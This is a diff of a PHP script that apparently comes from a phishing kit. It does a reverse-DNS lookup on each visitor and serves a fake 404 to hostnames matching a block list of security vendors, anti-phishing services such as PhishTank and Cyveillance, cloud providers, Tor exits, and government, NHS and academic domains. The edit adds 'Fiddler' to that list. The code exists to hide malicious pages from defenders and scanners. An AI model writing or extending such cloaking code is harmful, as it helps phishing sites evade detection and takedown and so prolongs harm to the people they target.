@@ -1,6 +1,6 @@
 <?php
 $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
-$blocked_words = array("barracuda","microsoft","digitalocean","above","google","kaspersky","avast","aruba","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","thor","tor","amazon","trendmicro","cisco","proxy","msn","messagelabs","lgfl","razorblue","essensys","tkmaxx","satcomgroup","aurora","exit","leblibrary","vive","webdefence","forcepoint","shef","example","scaleway","choopa","voxility","mail","remote","gov","redstone","nhs","yahoo","crawl","ac.uk","scansafe");
+$blocked_words = array("barracuda","microsoft","digitalocean","above","google","kaspersky","avast","aruba","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","thor","tor","amazon","trendmicro","cisco","proxy","msn","messagelabs","lgfl","razorblue","essensys","tkmaxx","satcomgroup","aurora","exit","leblibrary","vive","webdefence","forcepoint","shef","example","scaleway","choopa","voxility","mail","remote","gov","redstone","nhs","yahoo","Fiddler","crawl","ac.uk","scansafe");
 foreach($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
 		header("HTTP/1.0 404 Not Found");
